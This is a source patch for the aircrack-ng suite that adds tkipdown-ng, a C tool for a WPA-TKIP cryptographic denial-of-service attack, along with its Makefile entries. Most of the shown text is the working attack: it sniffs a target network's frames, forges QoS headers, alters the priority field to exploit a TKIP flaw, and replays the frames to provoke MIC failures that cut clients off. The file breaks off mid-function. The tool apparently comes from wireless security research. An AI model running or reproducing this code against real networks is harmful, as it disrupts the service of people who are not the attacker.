@@ -1,0 +1,1353 @@
+Index: src/Makefile
+===================================================================
+--- src/Makefile	(revision 2275)
++++ src/Makefile	(working copy)
+@@ -27,7 +27,7 @@
+ 
+ 
+ SBINFILES       = aireplay-ng$(EXE) airodump-ng$(EXE) airserv-ng$(EXE) \
+-		  airtun-ng$(EXE) airbase-ng$(EXE) besside-ng$(EXE)
++		  airtun-ng$(EXE) airbase-ng$(EXE) besside-ng$(EXE) tkipdown-ng$(EXE)
+ 		  
+ OPTFILES	= aircrack-ng-opt-prof_gen aircrack-ng-opt \
+ 		  aircrack-ng-opt-prof prof/*
+@@ -65,6 +65,7 @@
+ OBJS_AB		= airbase-ng.o common.o crypto.o osdep/radiotap/radiotap-parser.o
+ OBJS_AU		= airdecloak-ng.o common.o osdep/radiotap/radiotap-parser.o
+ OBJS_TT		= tkiptun-ng.o common.o crypto.o osdep/radiotap/radiotap-parser.o
++OBJS_TD		= tkipdown-ng.o common.o
+ OBJS_WC		= wpaclean.o osdep/radiotap/radiotap-parser.o
+ 
+ OSD		= osdep
+@@ -180,6 +181,9 @@
+ tkiptun-ng$(EXE): $(OBJS_TT) $(LIBOSD)
+ 	$(CC) $(CFLAGS) $(LDFLAGS) $(OBJS_TT) -o $(@) $(LIBS) $(LIBSSL)
+ 
++tkipdown-ng$(EXE): $(OBJS_TD) $(LIBOSD)
++	$(CC) $(CFLAGS) $(LDFLAGS) $(OBJS_TD) -o $(@) $(LIBS) $(LIBPCAP)
++
+ wpaclean$(EXE): $(OBJS_WC) $(LIBOSD)
+ 	$(CC) $(CFLAGS) $(LDFLAGS) $(OBJS_WC) -o $(@) $(LIBS)
+ 
+@@ -188,7 +192,7 @@
+ 
+ clean:
+ 	$(MAKE) -C $(OSD) clean
+-	-rm -f $(SBINFILES) $(BINFILES) $(OPTFILES) airolib-ng$(EXE) *.o wesside-ng$(EXE) tkiptun-ng$(EXE) easside-ng$(EXE) buddy-ng$(EXE) a.out
++	-rm -f $(SBINFILES) $(BINFILES) $(OPTFILES) airolib-ng$(EXE) *.o wesside-ng$(EXE) tkiptun-ng$(EXE) tkipdown-ng$(EXE) easside-ng$(EXE) buddy-ng$(EXE) a.out
+ 
+ distclean: clean
+ 
+@@ -221,6 +225,7 @@
+ 	-rm -f $(DESTDIR)$(bindir)/makeivs-ng$(EXE)
+ 	-rm -f $(DESTDIR)$(bindir)/airdecloak-ng$(EXE)
+ 	-rm -f $(DESTDIR)$(sbindir)/tkiptun-ng$(EXE)
++	-rm -f $(DESTDIR)$(sbindir)/tkipdown-ng$(EXE)
+ 	-rm -rf $(DESTDIR)$(etcdir)
+ 
+ check: aircrack-ng$(EXE)
+Index: src/tkipdown-ng.c
+===================================================================
+--- src/tkipdown-ng.c	(revision 0)
++++ src/tkipdown-ng.c	(revision 0)
+@@ -0,0 +1,1216 @@
++/*
++ *  802.11 WPA-TKIP Cryptographic Denial of Service
++ *
++ *  Copyright (C) 2012-2013 Mathy Vanhoef & Thomas d'Otreppe
++ *
++ *  This program is free software; you can redistribute it and/or modify
++ *  it under the terms of the GNU General Public License as published by
++ *  the Free Software Foundation; either version 2 of the License, or
++ *  (at your option) any later version.
++ *
++ *  This program is distributed in the hope that it will be useful,
++ *  but WITHOUT ANY WARRANTY; without even the implied warranty of
++ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
++ *  GNU General Public License for more details.
++ *
++ *  You should have received a copy of the GNU General Public License
++ *  along with this program; if not, write to the Free Software
++ *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
++ *
++ *
++ *  In addition, as a special exception, the copyright holders give
++ *  permission to link the code of portions of this program with the
++ *  OpenSSL library under certain conditions as described in each
++ *  individual source file, and distribute linked combinations
++ *  including the two.
++ *  You must obey the GNU General Public License in all respects
++ *  for all of the code used other than OpenSSL. *  If you modify
++ *  file(s) with this exception, you may extend this exception to your
++ *  version of the file(s), but you are not obligated to do so. *  If you
++ *  do not wish to do so, delete this exception statement from your
++ *  version. *  If you delete this exception statement from all source
++ *  files in the program, then also delete it here.
++ */
++#include <stdint.h>
++#include <stdlib.h>
++#include <stdbool.h>
++#include <stdio.h>
++#include <unistd.h>
++#include <string.h>
++#include <getopt.h>
++#include <errno.h>
++#include <sys/time.h>
++#include <time.h>
++#include <signal.h>
++#include <assert.h>
++#include <stdarg.h>
++
++
++#include "common.h"
++#include "osdep/osdep.h"
++#include "packets.h"
++
++// FIXME: This should be in a header
++extern unsigned char * getmac(char * macAddress, int strict, unsigned char * mac);
++
++#define UNUSED_ARG(x)	(void)(x)
++
++char usage[] =
++
++"\n"
++"  tkipdown-ng - (C) 2012 Mathy Vanhoef\n"
++"  http://www.aircrack-ng.org\n"
++"\n"
++"  usage: tkipdown-ng <options> <replay interface>\n"
++"\n"
++"  Attack options:\n"
++"\n"
++"      -e essid     : set target network SSID\n"
++"      -n num       : number of times to replay a packet, set to zero to only monitor network\n"
++"      -r           : disable QoS header from being added when not present\n"
++"      -c chan      : channel to use\n"
++"\n"
++"  Filter options:\n"
++"\n"
++"      -b bssid     : MAC address of target Access Point (AP)\n"
++"      -s dmac      : MAC address of target client\n"
++"      -t           : frame control, To DS bit must be set for data frames\n"
++"      -f           : frame control, From DS bit must be set for data frames\n"
++"      --berlin sec : Time before removing the station from the screen when\n"
++"                     no more packets are received (Default: 150 seconds)\n"
++"      --demo       : When specified the 4 middle bytes of the MAC address will be hidden\n"
++"\n";
++
++/** Attack options */
++struct options
++{
++	int replayCount;
++	int channel;
++	bool addQosHeader;
++	bool enableApDetection;
++	uint8_t macClient[6];
++	/** false if toDS bit doesn't matter, true if it must be set */
++	bool toDs;
++	/** false if fromDs bit doesn't matter, true if it must be set */
++	bool fromDs;
++	/** when true the 4 middle bytes of the MAC adresses will not be shown */
++	bool demoMode;
++	/** How long a station can be inactive before it's no longer shown */
++	struct timeval stationTimeout;
++
++	char replayInterface[128];
++} opt;
++
++/** wireless interface used to capture and inject packets */
++struct devices
++{
++	// wifi output & input interface
++	int fd;
++	struct wif *wi;
++} dev;
++
++/** information of the wireless network we are attacking */
++struct NetworkInfo
++{
++	char ssid[128];
++	uint8_t bssid[6];
++
++	bool gotBeacon;
++	int channel;
++	bool qosSupport;
++	bool isWpaTkip;
++
++	struct timeval timeLastReplay;
++} networkInfo;
++
++typedef enum EncryptionAlgo
++{
++	EncAlgo_Unknown,
++	EncAlgo_Open,
++	EncAlgo_Wep,
++	EncAlgo_Tkip,
++	EncAlgo_Ccmp,
++	EncAlgo_TkipOrCcmp
++} EncryptionAlgo;
++
++/** information about a station connected to the network we will attack */
++typedef struct StationInfo
++{
++	uint8_t mac[6];
++	int numDataFrames;
++	int numFrames;
++	int numMicFailes;
++	int numDeauths;
++	int numAssnFails;
++	int numReplays;
++
++	// type of encryption used
++	EncryptionAlgo encAlgo;
++	int hintsCcmp;
++
++	// last time we heard something from the station
++	struct timeval lastCapture;
++
++	// to easily create a linked list of StationInfo's
++	struct StationInfo *next;
++} StationInfo;
++
++/** Linked list of stations */
++StationInfo *stationList = NULL;
++
++/** Ring buffer to store messages which are displayed in the console interface */
++struct LogMessages
++{
++	int currIndex;
++	int numMessages;
++	char messages[8][2048];
++} logs;
++
++void initLogs()
++{
++	memset(&logs, 0, sizeof(logs));
++}
++
++void logMessage(const char *format, ...)
++{
++	char buffer[1000];
++	int index;
++	time_t tt;
++	struct tm *lt;
++	va_list args;
++	va_start (args, format);
++
++	tt = time(NULL);
++	lt = localtime(&tt);
++
++	index = (logs.currIndex - 1) % 8;
++	if (index < 0)
++		index = 7;
++
++	vsnprintf(buffer, sizeof(buffer), format, args);
++	sprintf(logs.messages[index], "%02d:%02d:%02d %.1000s", lt->tm_hour, lt->tm_min, lt->tm_sec, buffer);
++
++	if (logs.numMessages < 8)
++		logs.numMessages++;
++
++	logs.currIndex = index;
++}
++
++const char *encAlgoToStr(EncryptionAlgo algo)
++{
++	switch (algo)
++	{
++	case EncAlgo_Open: return "OPEN";
++	case EncAlgo_Wep: return "WEP";
++	case EncAlgo_Tkip: return "TKIP";
++	case EncAlgo_Ccmp: return "CCMP";
++	case EncAlgo_TkipOrCcmp: return "TKIP or CCMP";
++
++	case EncAlgo_Unknown:
++	default:
++		return "???";
++	}
++}
++
++void printUsage()
++{
++	printf("%s", usage);
++}
++
++bool isEmpty(uint8_t *buffer, size_t len)
++{
++	size_t i;
++
++	for (i = 0; i < len; ++i)
++	{
++		if (buffer[i] != 0)
++			return false;
++	}
++
++	return true;
++}
++
++const char *mactostr(uint8_t mac[6])
++{
++	static char buffer[128];
++
++	if (opt.demoMode) {
++		sprintf(buffer, "%02X:%02X:XX:XX:XX:%02X", mac[0], mac[1], mac[5]);
++	} else {
++		sprintf(buffer, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
++	}
++
++	return buffer;
++}
++
++const char *getstrchannel()
++{
++	static char buffer[128];
++
++	if (wi_get_channel(dev.wi) == -1)
++		return "<unknown>";
++	else
++		sprintf(buffer, "%d", wi_get_channel(dev.wi));
++
++	return buffer;
++}
++
++bool parseConsoleArgs(int argc, char *argv[])
++{
++	int option_index = 0;
++	int c, rval, numarg;
++
++	static struct option long_options[] = {
++		{"help",      0, 0, 'h'},
++		{"demo",      0, 0, 'p'},
++		{"berlin",    0, 0, 'B'}
++	};
++
++	if (argc <= 1) {
++		printUsage();
++		return false;
++	}
++
++	// default settings
++	memset(&opt, 0, sizeof(opt));
++	opt.addQosHeader = true;
++	opt.replayCount = 3;
++	opt.channel = -1;
++	opt.enableApDetection = true;
++	opt.toDs = false;
++	opt.fromDs = false;
++	opt.demoMode = false;
++	opt.stationTimeout.tv_sec = 150;
++	opt.stationTimeout.tv_usec = 0;
++	memset(&networkInfo, 0, sizeof(networkInfo));
++	networkInfo.gotBeacon = false;
++
++	while ((c = getopt_long(argc, argv, "e:b:c:n:s:rDtfpB", long_options, &option_index)) != -1)
++	{
++		switch (c)
++		{
++		case 'h':
++			printUsage();
++			// when help is requested, don't do anything other then displaying the message
++			return false;
++
++		case 'e':
++			if (!isEmpty(networkInfo.bssid, 6))
++			{
++				printf("You already specified the MAC address of the AP, ignoring -e parameter.\n");
++			}
++			else
++			{
++				strncpy(networkInfo.ssid, optarg, sizeof(networkInfo.ssid));
++				networkInfo.ssid[sizeof(networkInfo.ssid) - 1] = '\0';
++			}
++			break;
++
++		case 'b':
++			if (networkInfo.ssid[0] != '\0')
++			{
++				printf("You already specified the SSID of the AP, ignoring -b parameter.\n");
++			}
++			else if (getmac(optarg, 1, networkInfo.bssid) != 0 )
++			{
++				printf("Invalid BSSID (AP MAC address).\n");
++				printf("\"tkipdown-ng --help\" for help.\n");
++				return false;
++			}
++			break;
++
++		case 'n':
++			rval = sscanf(optarg, "%d", &opt.replayCount);
++			if (opt.replayCount < 0 || rval != 1)
++			{
++				printf("Invalid replay count specified.\n");
++				printf("\"tkipdown-ng --help\" for help.\n");
++				return false;
++			}
++			break;
++
++		case 's':
++			if (getmac(optarg, 1, opt.macClient) != 0 )
++			{
++				printf("Invalid client MAC address.\n");
++				printf("\"tkipdown-ng --help\" for help.\n");
++				return false;
++			}
++			break;
++
++		case 'c':
++			rval = sscanf(optarg, "%d", &opt.channel);
++			if (opt.channel < 0 || rval != 1)
++			{
++				printf("Invalid channel id specified.\n");
++				printf("\"tkipdown-ng --help\" for help.\n");
++				return false;
++			}
++			break;
++
++		case 'r':
++			opt.addQosHeader = false;
++			break;
++
++		case 'D':
++			opt.enableApDetection = false;
++			break;
++
++		case 't':
++			opt.toDs = true;
++			break;
++
++		case 'f':
++			opt.fromDs = true;
++			break;
++
++		case 'B':
++			rval = sscanf(optarg, "%d", &numarg);
++			if (numarg < 0 || rval != 1)
++			{
++				printf("Invalid station timeout specified in the --berlin parameter.\n");
++				printf("\"tkipdown-ng --help\" for help.\n");
++				return false;
++			}
++			opt.stationTimeout.tv_sec = numarg;
++			break;
++
++		case 'p':
++			opt.demoMode = true;
++			break;
++
++		default:
++			return false;
++		}
++	}
++
++	if (argc - optind == 0)
++	{
++		printf("No replay interface specified.\n");
++		printf("\"tkipdown-ng --help\" for help.\n");
++		return false;
++	}
++
++	if (isEmpty(networkInfo.bssid, 6) && networkInfo.ssid[0] == '\0' && isEmpty(opt.macClient, 6))
++	{
++		printf("You must specify a target SSID (-e), MAC of target AP (-b), or a client (-h).\n");
++		printf("\"tkipdown-ng --help\" for help.\n");
++		return false;
++	}
++
++	strncpy(opt.replayInterface, argv[optind], sizeof(opt.replayInterface));
++	opt.replayInterface[sizeof(opt.replayInterface) - 1] = '\0';
++
++	return true;
++}
++
++/** Open the interface used to capture/inject packets */
++bool openDevices()
++{
++	/* open the replay interface */
++	dev.wi = wi_open(opt.replayInterface);
++	if (!dev.wi)
++		return false;
++
++	dev.fd = wi_fd(dev.wi);
++
++	/* configure channel */
++	if (opt.channel != -1)
++	{
++		if (wi_set_channel(dev.wi, opt.channel) == -1)
++		{
++			printf("Error setting channel to %d\n", opt.channel);
++		}
++	}
++
++	return true;
++}
++
++/** Read a captured packet (potentially blocks for 1 second) */
++int readPacket(uint8_t *buffer, size_t size)
++{
++	fd_set rfds;
++	struct timeval timeout;
++	int caplen, rval;
++	FD_ZERO(&rfds);
++	FD_SET(dev.fd, &rfds);
++
++	timeout.tv_sec = 1;
++	timeout.tv_usec = 0;
++	rval = select(dev.fd + 1, &rfds, NULL, NULL, &timeout);
++	if (rval < 0) {
++		printf("Something went wrong polling replay interface: %s\n", strerror(errno));
++		return -1;
++	}
++
++	if (!FD_ISSET(dev.fd, &rfds))
++		return 0;
++
++	caplen = wi_read(dev.wi, buffer, size, NULL);
++	if (caplen == -1)
++	{
++		printf("Something went wrong reading replay interface: %s\n", strerror(errno));
++		return -1;
++	}
++
++	return caplen;
++}
++
++
++/** Search through the linked list */
++StationInfo * findStation(uint8_t mac[6])
++{
++	StationInfo *curr = stationList;
++
++	while (curr != NULL)
++	{
++		if (memcmp(curr->mac, mac, 6) == 0)
++			return curr;
++
++		curr = curr->next;
++	}
++
++	return NULL;
++}
++
++/** Add station as head of the linked list */
++StationInfo * addStation(uint8_t mac[6])
++{
++	assert(findStation(mac) == NULL);
++
++	StationInfo *newStation = malloc(sizeof(StationInfo));
++	memset(newStation, 0, sizeof(StationInfo));
++	memcpy(newStation->mac, mac, 6);
++
++	newStation->next = stationList;
++	stationList = newStation;
++
++	return newStation;
++}
++
++/** Free the list of stations */
++void freeStationList()
++{
++	StationInfo *curr = stationList;
++
++	while (curr != NULL)
++	{
++		StationInfo *next = curr->next;
++		free(curr);
++
++		curr = next;
++	}
++
++	stationList = NULL;
++}
++
++void increaseStationDeauths(uint8_t mac[])
++{
++	StationInfo *station = findStation(mac);
++	if (station == NULL)
++		station = addStation(mac);
++
++	station->numDeauths++;
++	station->numFrames++;
++	gettimeofday(&station->lastCapture, NULL);
++}
++
++void increaseStationMicFails(uint8_t mac[])
++{
++	StationInfo *station = findStation(mac);
++	if (station == NULL)
++		station = addStation(mac);
++
++	station->numMicFailes++;
++	gettimeofday(&station->lastCapture, NULL);
++}
++
++void increaseStationAssnFails(uint8_t mac[])
++{
++	StationInfo *station = findStation(mac);
++	if (station == NULL)
++		station = addStation(mac);
++
++	station->numAssnFails++;
++	station->numFrames++;
++	gettimeofday(&station->lastCapture, NULL);
++}
++
++void processDeauthFrame(uint8_t *buffer, int length)
++{
++	UNUSED_ARG(length);
++	ieee80211header *header = (ieee80211header *)buffer;
++	int mi_d = 4;
++	int mi_s = 10;
++	int mi_b = 16;
++	int mi_client;
++
++	// Is it a deauthentication packet
++	if (header->framecontrol.type != 0 || header->framecontrol.subtype != 0xC)
++		return;
++
++	// Check if deauthentication
++	if (memcmp(buffer, "\xC0\x00\x3A\x01", 4) != 0)
++		return;
++
++	// Is it from the targeted network
++	if (memcmp(buffer + mi_b, networkInfo.bssid, 6) != 0)
++		return;
++
++	// Find out who the client is
++	if (memcmp(buffer + mi_s, networkInfo.bssid, 6) == 0)
++		mi_client = mi_d;
++	else
++		mi_client = mi_s;
++
++	// Now increase the deauth numbers of the client
++	increaseStationDeauths(buffer + mi_client);
++}
++
++bool processMicFailure(uint8_t *buffer, int length, uint8_t macSender[6])
++{
++	struct timeval now, diff, max;
++	ieee80211header *header = (ieee80211header *)buffer;
++	bool isQos = header->framecontrol.subtype == 8;
++	int z = isQos ? 26 : 24;
++
++	// At this point all other checks have been done in processDataFrame, including
++	// assuring that it's possible TKIP encrypted
++
++	if (length != z + 127)
++		return false;
++
++	// MIC failure report must be sent right after we replayed a modified frame
++	diff.tv_sec = 0;
++	diff.tv_usec = 500 * 1000;
++	timeradd(&networkInfo.timeLastReplay, &diff, &max);
++
++	gettimeofday(&now, NULL);
++	if (!timercmp(&now, &max, <))
++		return false;
++
++	// Now increase the MIC failures numbers of the client
++	increaseStationMicFails(macSender);
++
++	return true;
++}
++
++/**
++ * Also see http://anonsvn.wireshark.org/wireshark/trunk/epan/dissectors/packet-ieee80211.c and
++ * specifically "#define IS_TKIP" and "#define IS_CCMP". Unfortunately these #define's used in
++ * wireshark are only heuristics and can be wrong! Instead our code will be 100% certain when
++ * returning a specific encryption type.
++ */
++EncryptionAlgo getNetworkEncryptionAlgo(uint8_t *buffer, int length, int *hintsCcmp)
++{
++	UNUSED_ARG(length);
++	ieee80211header *header = (ieee80211header *)buffer;
++	tkipheader *tkip;
++	bool isQos = header->framecontrol.subtype == 8;
++	int z = isQos ? 26 : 24;
++
++	tkip = (tkipheader *)(buffer + z);
++
++	// Must be a data frame
++	if (header->framecontrol.type != 2)
++		return EncAlgo_Unknown;
++
++	// Is the WEP bit set?
++	if (header->framecontrol.protectedframe == 1)
++	{
++		// Is the extended IV bit set?
++		if (tkip->iv.extendediv == 1)
++		{
++			// We now know it's either TKIP or CCMP
++
++			// In CCMP 3rd byte of the IV is always zero. So if it's *not* zero it's TKIP.
++			if (tkip->iv.tsc0 != 0)
++			{
++				return EncAlgo_Tkip;
++			}
++			// In TKIP byte 2 is filled with the specially crafted value ((TSC[1] | 0x20) & 0x7f) that is
++			// designed to avoid weak keys. Note that TSC[1] is saved as the first byte of the IV.
++			// If this is not done in the frame it can only be a CCMP frame.
++			else if (tkip->iv.wepseed != ((tkip->iv.tsc1 | 0x20) & 0x7F))
++			{
++				return EncAlgo_Ccmp;
++			}
++			// There is only a chance of 1/256 that buffer[z+3] == 0 when it's TKIP. So if it was zero
++			// it's an indication that it *could* be CCMP.
++			else if (hintsCcmp)
++			{
++				(*hintsCcmp)++;
++			}
++
++			return EncAlgo_TkipOrCcmp;
++		}
++		// If the extended IV bit is not set it must be WEP
++		else
++		{
++			return EncAlgo_Wep;
++		}
++	}
++	else
++	{
++		// Is the (unencrypted) LLC header pointing to an EAPOL packet, and is that
++		// one an EAPOL-Key frame?
++		if (memcmp(buffer + z, "\xAA\xAA\x03\x00\x00\x00\x88\x8E", 8) == 0
++				&& buffer[z + 8 + 1] == 3)
++		{
++			// For both version 802.1X-2001 (WPA) and 802.1X-2004 (WPA2) we can derive the used
++			// encryption algorithm from the Key Information field of the EAPOL-Key frame. In
++			// principle we would have to look at the WPA Key Data but that's more complicated.
++			if ((buffer[z + 8 + 6] & 0x07) == 1)
++				return EncAlgo_Tkip;
++			else if ((buffer[z + 8 + 6] & 0x07) == 2)
++				return EncAlgo_Ccmp;
++		}
++		// Or is the LLC header pointing to an ethernet/IP or ethernet/ARP packet?
++		else if (memcmp(buffer + z, "\xAA\xAA\x03\x00\x00\x00\x08\x00", 8) == 0
++				|| memcmp(buffer + z, "\xAA\xAA\x03\x00\x00\x00\x08\x06", 8) == 0)
++		{
++			return EncAlgo_Open;
++		}
++	}
++
++	return EncAlgo_Unknown;
++}
++
++void processDataFrame(uint8_t *buffer, int length)
++{
++	ieee80211header *header = (ieee80211header *)buffer;
++	int mi_b = 0, mi_s = 0, mi_d = 0, mi_client, i;
++	bool isQos = header->framecontrol.subtype == 8;
++	struct timeval now, diff, max;
++
++	// Must be a data frame
++	if (header->framecontrol.type != 2)
++		return;
++
++	//
++	// STEP 1 - Get network data if applicable
++	//
++
++	if (header->framecontrol.tods == header->framecontrol.fromds)
++	{
++		// If both are zero:
++		// p26 ..one STA to another STA within the same IBBS .. non-AP STA to another
++		// non-AP STA within the same BBS .. management frames. We ignore these for the time being.
++
++		// If both are one: WDS packet
++		return;
++	}
++
++	// Get locations of MAC addresses
++	if (header->framecontrol.tods == 1)
++	{
++		mi_b = 4;
++		mi_s = 10;
++		mi_d = 16;
++		mi_client = mi_s;
++	}
++	else
++	{
++		mi_b = 10;
++		mi_s = 16;
++		mi_d = 4;
++		mi_client = mi_d;
++	}
++
++	// Don't consider broadcast and multicast packets (they are not clients!)
++	if (memcmp(buffer + mi_client, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) == 0 // broadcast
++			|| memcmp(buffer + mi_client, "\x01\x00\x5E", 3) == 0 // IPv4mcast
++			|| memcmp(buffer + mi_client, "\x33\x33", 2) == 0) // IPv6mcast
++		return;
++
++	// If SSID and BSSID has not been set, check if it's from the targeted client and set the BSSID
++	if (isEmpty(networkInfo.bssid, 6) && networkInfo.ssid[0] == '\0' && memcmp(buffer + mi_client, opt.macClient, 6))
++	{
++		memcpy(networkInfo.bssid, buffer + mi_b, 6);
++	}
++
++	// Packet must be from targeted BSSID. Note that if we don't have the BSSID yet it will be all
++	// zero's and we will return here.
++	if (memcmp(networkInfo.bssid, buffer + mi_b, 6) != 0)
++		return;
++
++	//
++	// STEP 2 - Update station info
++	//
++
++	StationInfo *station = findStation(buffer + mi_client);
++	if (station == NULL)
++		station = addStation(buffer + mi_client);
++
++	station->numDataFrames++;
++	station->numFrames++;
++	gettimeofday(&station->lastCapture, NULL);
++
++	int hintsEas = 0;
++	EncryptionAlgo algo = getNetworkEncryptionAlgo(buffer, length, &hintsEas);
++	if (algo != EncAlgo_Unknown && algo != EncAlgo_TkipOrCcmp)
++		station->encAlgo = algo;
++	else if (algo == EncAlgo_TkipOrCcmp && station->encAlgo == EncAlgo_Unknown)
++		station->encAlgo = algo;
++	else
++		station->hintsCcmp += hintsEas;
++
++	// Check if it could be a MIC failure report. Remember that a MIC failure report can also be
++	// replayed because it's encrypted.
++	if (algo == EncAlgo_Tkip || algo == EncAlgo_TkipOrCcmp)
++		processMicFailure(buffer, length, buffer + mi_s);
++
++
++	//
++	// STEP 3 - Execute the attack if the packet passes the filters
++	//
++
++	// If replaying frames is disabled, stop here
++	if (opt.replayCount <= 0)
++		return;
++
++	// Attack only works against tkip. Must check WEP bit since EAPOL packets
++	// will also return an encryption algo!
++	if (header->framecontrol.protectedframe == 0)
++		return;
++	// Now make sure it's a TKIP packet
++	if (algo != EncAlgo_Tkip)
++	{
++		if (algo == EncAlgo_TkipOrCcmp && station->encAlgo == EncAlgo_Tkip)
++			; // all okay
++		else
++			return; // not okay
++	}
++
++	// In order to replay it must first pass the filters set the by user
++	if (opt.fromDs && header->framecontrol.fromds != 1)
++		return;
++	if (opt.toDs && header->framecontrol.tods != 1)
++		return;
++	if (!isEmpty(opt.macClient, 6) && memcmp(buffer + mi_d, opt.macClient, 6) != 0
++			&& memcmp(buffer + mi_s, opt.macClient, 6) != 0)
++		return;
++
++	// Last replay attack must be at least 1,5 seconds ago
++	diff.tv_sec = 1;
++	diff.tv_usec = 500 * 1000;
++	timeradd(&networkInfo.timeLastReplay, &diff, &max);
++
++	gettimeofday(&now, NULL);
++	if (timercmp(&now, &max, <))
++		return;
++
++	// If it's not a QoS packet add the header if applicable. See Falsification Attacks against WPA-TKIP
++	// in a Realistic Environment, paragraph 5 The QoS Forgery Attack.
++	if (!isQos && opt.addQosHeader)
++	{
++		// set type to QoS frame
++		header->framecontrol.subtype = 8;
++
++		// make space for the two QoS bytes
++		memmove(buffer + 26, buffer + 24, length - 24);
++
++		// fill in the QoS bytes - give it priority 0 (Best Effort)
++		buffer[24] = 0x00;
++		buffer[25] = 0x00;
++
++		// packet got bigger
++		length += 2;
++	}
++
++	// Change the priority of the frame - here the vulnerability is exploited !!
++	header->qos.tid ^= 1;
++
++	// And transmit it
++	for (i = 0; i < opt.replayCount; ++i) {
++		wi_write(dev.wi, buffer, length, NULL);
++		usleep(10);
++	}
++
++	station->numReplays += opt.replayCount;
++	gettimeofday(&networkInfo.timeLastReplay, NULL);
++
++	if (!isQos && opt.addQosHeader) {
++		logMessage("Forged QoS and replayed packet %d times (%s, client %s).",
++				opt.replayCount,
++				(buffer[1] & 3) == 1 ? "to AP" : "from AP",
++				mactostr(buffer + mi_client));
++	} else {
++		logMessage("Replayed packet %d times (%s, client %s).",
++				opt.replayCount,
++				(buffer[1] & 3) == 1 ? "to AP" : "from AP",
++				mactostr(buffer + mi_client));
++	}
++}
++
++void processBeaconFrame(uint8_t *buffer, int length)
++{
++	ieee80211header *header = (ieee80211header *)buffer;
++	int pos, i;
++	bool ourSsid;
++	bool isWpaTkip;
++	bool isQosEnabled;
++
++	// Is it a beacon frame?
++	if (length <= 22 || header->framecontrol.type != 0 || header->framecontrol.subtype != 8
++		|| memcmp(buffer + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)
++		return;
++
++	// Assume beacon is of our ssid until proven otherwise
++	ourSsid = true;
++	isWpaTkip = false;
++	isQosEnabled = false;
++
++	pos = 24; // skip 802.11 header
++	pos += 12; // skip fixed parameters
++
++	// If we were given the MAC of the AP then verify it
++	if (!isEmpty(networkInfo.bssid, 6))
++	{
++		// addr3 contains the BSSID
++		if (memcmp(networkInfo.bssid, buffer + 16, 6) != 0)
++			return;
++	}
++	// If the SSID also isn't set, we are targeting a client and must wait until it has sent something
++	else if (networkInfo.ssid[0] == '\0')
++	{
++		return;
++	}
++
++	// iterate over all tagged parameters of the beacon frame
++	while (ourSsid && pos < length)
++	{
++		switch(buffer[pos])
++		{
++		// SSID parameter set
++		case 0:
++			if (networkInfo.ssid[0] == '\0')
++			{
++				// If we were given only the bssid save the ssid of the network
++				int ssidlen = buffer[pos + 1] < sizeof(networkInfo.ssid) - 1 ? buffer[pos + 1] : sizeof(networkInfo.ssid) - 1;
++				strncpy(networkInfo.ssid, (char*)(buffer + pos + 2), ssidlen);
++				networkInfo.ssid[ssidlen] = '\0';
++			}
++			else
++			{
++				size_t ssidlen = buffer[pos + 1];
++				ourSsid = strlen(networkInfo.ssid) == ssidlen && strncmp(networkInfo.ssid, (char*)(buffer + pos + 2), ssidlen) == 0;
++
++				if (ourSsid)
++					memcpy(networkInfo.bssid, buffer + 10, 6);
++			}
++			break;
++
++		// DS parameter set: Current Channel
++		case 3:
++			networkInfo.channel = buffer[pos + 2];
++			break;
++
++		// RSN Information (WPA2)
++		case 48:
++			// Must be RSN version 1
++			if (buffer[pos + 2] == 1 && buffer[pos + 3] == 0)
++			{
++				int numPairwiseSuites = buffer[pos + 8] + buffer[pos + 9] * 0x100;
++				for (i = 0; i < numPairwiseSuites && pos + 14 + 4*i <= length; ++i)
++				{
++					// Pairwise cipher suite IEEE 8021 TKIP
++					if (memcmp(buffer + pos + 10 + i*4, "\x00\x0F\xAC\x02", 4) == 0)
++						isWpaTkip = true;
++				}
++			}
++			break;
++
++		// Vender Specific parameter set
++		case 221:
++			// Microsoft OUI, type WPA Information Element, WPA version 1
++			if (memcmp(buffer + pos + 2, "\x00\x50\xF2\x01\x01\x00", 6) == 0)
++			{
++				int numUnicastSuites = buffer[pos + 12] + buffer[pos + 13] * 0x100;
++				for (i = 0; i < numUnicastSuites && pos + 18 + 4*i <= length; ++i)
++				{
++					// Microsoft Unicast Cipher Suite OUI, Suite Type TKIP
++					if (memcmp(buffer + pos + 14 + i*4, "\x00\x50\xf2\x02", 4) == 0)
++						isWpaTkip = true;
++				}
++			}
++			// Microsoft OUI, type WMM/WME, WME Version 1
++			else if (memcmp(buffer + pos + 2, "\x00\x50\xF2\x02\x01\x01", 6) == 0)
++			{
++				isQosEnabled = true;
++			}
++			break;
++		}
++
++		// move to next parameter
++		pos += 2 + buffer[pos + 1];
++	}
++
++	if (ourSsid) {
++		networkInfo.gotBeacon = true;
++		networkInfo.isWpaTkip = isWpaTkip;
++		networkInfo.qosSupport = isQosEnabled;
++	}
++}
++
++void processAssnFrame(uint8_t *buffer, int length)
++{
++	UNUSED_ARG(length);
++	ieee80211header *header = (ieee80211header *)buffer;
++	int mi_d = 4;
++	//int mi_s = 10;
++	int mi_b = 16;
++
++	// Only care about (re)association response.
++	if (header->framecontrol.subtype == 1 || header->framecontrol.subtype == 3)
++		return;
++
++	// Must be from our network
++	if (memcmp(buffer + mi_b, networkInfo.bssid, 6) != 0)
++		return;
++
++	// See IEEE Std 802.11-2007 Part 11 - 7.3.1.9 Status Code Field
++	// Status Code 11: Association denied due to reason outside the scope of this standard
++	if (buffer[26] != 0xC || buffer[27] != 0x00)
++		return;
++
++	// Now increase the association failure numbers of the client
++	increaseStationAssnFails(buffer + mi_d);
++}
++
++void processUnknownFrame(uint8_t *buffer, int length)
++{
++	UNUSED_ARG(buffer);
++	UNUSED_ARG(length);
++}
++
++void processFrame(uint8_t *buffer, int length)
++{
++	ieee80211header *header = (ieee80211header *)buffer;
++
++	if (header->framecontrol.version != 0)
++		return; 
++
++	/** see IEEE Std 802.11-2007 Part 11 - 7.1.3.1 Frame Control Field */
++	switch(buffer[0])
++	{
++	case 0x80: // Beacon
++		processBeaconFrame(buffer, length);
++		break;
++
++	case 0x08: // Data
++	case 0x88: // QoS Data
++		processDataFrame(buffer, length);
++		break;
++
++	case 0xC0: // Deauthentication
++		processDeauthFrame(buffer, length);
++		break;
++
++	case 0x00: // Association request
++	case 0x10: // Association response
++	case 0x20: // Reassociation request
